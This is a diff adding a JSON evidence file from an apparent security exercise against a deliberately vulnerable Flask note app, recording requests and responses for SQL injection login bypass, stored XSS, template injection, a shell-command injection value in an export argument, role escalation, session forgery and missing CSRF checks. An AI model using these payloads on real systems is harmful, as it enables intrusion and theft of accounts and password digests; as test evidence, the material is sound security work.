@@ -1,0 +1,85 @@
+{
+  "team": "Team Outsiders",
+  "marker": "3d821afbe8a0",
+  "captured_at": "2026-11-05T17:15:30.700295+00:00",
+  "baseline_sha256": "2d25d7dc1282cf743c9702e910f090b81fad6272a8b8793156d8431c5ab3aaa6",
+  "method": "Flask test client on a fresh temporary DB; no public listener; harmless output probes",
+  "limitations": "XSS injection and SSTI expression evaluation proven server-side; no browser script execution screenshot in this evidence.",
+  "results": [
+    {
+      "finding": "F-01",
+      "title": "SQL injection bypasses credential check",
+      "request": "POST /login username=admin' -- password=wrong",
+      "status": 302,
+      "response_excerpt": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\">\n<title>Redirecting...</title>\n<h1>Redirecting...</h1>\n<p>You should be redirected automatically to target URL: <a href=\"/\">/</a>. If not click the link."
+    },
+    {
+      "finding": "F-01",
+      "title": "Search exposes another owner\u2019s marker",
+      "request": "GET /search?q=' OR 1=1 -- ",
+      "status": 200,
+      "response_excerpt": "<a href=/>back</a><ul><li>groceries: milk, eggs</li><li>infra: prod db password is hunter2</li><li>build-tag: team=Team Outsiders marker=3d821afbe8a0</li></ul>"
+    },
+    {
+      "finding": "F-02",
+      "title": "Alice reads the administrator build marker",
+      "request": "GET /api/notes/3 as alice",
+      "status": 200,
+      "response_excerpt": "{\"body\":\"team=Team Outsiders marker=3d821afbe8a0\",\"id\":3,\"owner\":\"admin\",\"title\":\"build-tag\"}\n"
+    },
+    {
+      "finding": "F-03",
+      "title": "Registration accepts an administrator role",
+      "request": "POST /register role=admin; login; GET /admin",
+      "status": 200,
+      "response_excerpt": "[{\"id\":1,\"password\":\"15da1f78ad7d474862865bab1aab4d51\",\"role\":\"user\",\"username\":\"alice\"},{\"id\":2,\"password\":\"0192023a7bbd73250516f069df18b500\",\"role\":\"admin\",\"username\":\"admin\"},{\"id\":3,\"password\":\"e7eb3fb6c64d90b3524029a299a82c85\",\"role\":\"admin\",\"username\":\"probe_user\"}]\n"
+    },
+    {
+      "finding": "F-06",
+      "title": "Admin endpoint exposes password digests",
+      "request": "GET /admin after role escalation",
+      "status": 200,
+      "response_excerpt": "[{\"id\":1,\"password\":\"15da1f78ad7d474862865bab1aab4d51\",\"role\":\"user\",\"username\":\"alice\"},{\"id\":2,\"password\":\"0192023a7bbd73250516f069df18b500\",\"role\":\"admin\",\"username\":\"admin\"},{\"id\":3,\"password\":\"e7eb3fb6c64d90b3524029a299a82c85\",\"role\":\"admin\",\"username\":\"probe_user\"}]\n"
+    },
+    {
+      "finding": "F-04",
+      "title": "Stored content is inserted as executable HTML",
+      "request": "POST /notes body=<img src=x onerror=alert(1)>; GET /",
+      "status": 200,
+      "response_excerpt": "\n<!doctype html><title>NoteVault</title>\n<h1>NoteVault</h1>\n<p>Signed in as <b>alice</b> \u00b7 <a href=\"/logout\">logout</a>\n  </p>\n<form method=post action=\"/notes\"><input name=title placeholder=title>\n  <input name=body placeholder=note><button>Add note</button></form>\n<h3>Your notes</h3><li>#1 <b>groceries</b>: milk, eggs</li><li>#4 <b>XSS probe</b>: <img src=x onerror=alert(1)></li>\n<form action=\"/search\"><input name=q placeholder=\"search notes\"><button>Search</button></form>\n"
+    },
+    {
+      "finding": "F-04",
+      "title": "Stored template expression executes in search",
+      "request": "POST /notes body={{7*7}}; GET /search?q=7*7",
+      "status": 200,
+      "response_excerpt": "<a href=/>back</a><ul><li>Template probe: 49</li></ul>"
+    },
+    {
+      "finding": "F-05",
+      "title": "Export invokes a shell command",
+      "request": "GET /export?fmt=txt; printf NV_SAFE_PROBE",
+      "status": 200,
+      "response_excerpt": "<pre>exporting notes as txt\nNV_SAFE_PROBE</pre>"
+    },
+    {
+      "finding": "F-07",
+      "title": "Known source secret allows administrator session forgery",
+      "request": "Locally sign sub=admin with source SECRET; GET /admin",
+      "status": 200,
+      "response_excerpt": "[{\"id\":1,\"password\":\"15da1f78ad7d474862865bab1aab4d51\",\"role\":\"user\",\"username\":\"alice\"},{\"id\":2,\"password\":\"0192023a7bbd73250516f069df18b500\",\"role\":\"admin\",\"username\":\"admin\"},{\"id\":3,\"password\":\"e7eb3fb6c64d90b3524029a299a82c85\",\"role\":\"admin\",\"username\":\"probe_user\"}]\n"
+    },
+    {
+      "finding": "F-08",
+      "title": "Authenticated state change accepts foreign origin without token",
+      "request": "POST /notes with Origin: https://attacker.invalid, authenticated cookie, no CSRF token",
+      "status": 302,
+      "response_excerpt": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\">\n<title>Redirecting...</title>\n<h1>Redirecting...</h1>\n<p>You should be redirected automatically to target URL: <a href=\"/\">/</a>. If not click the link."
+    },
+    {
+      "finding": "F-08",
+      "cookie_attributes": "session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhbGljZSJ9.VPTt_vJleF9mu-24JUV6IdcQmAncJY6JQYcklOSME9E; Path=/",
+      "scope": "Server-side cross-origin acceptance demonstrated; browser exploitability depends on browser cookie defaults."
+    }
+  ]
+}
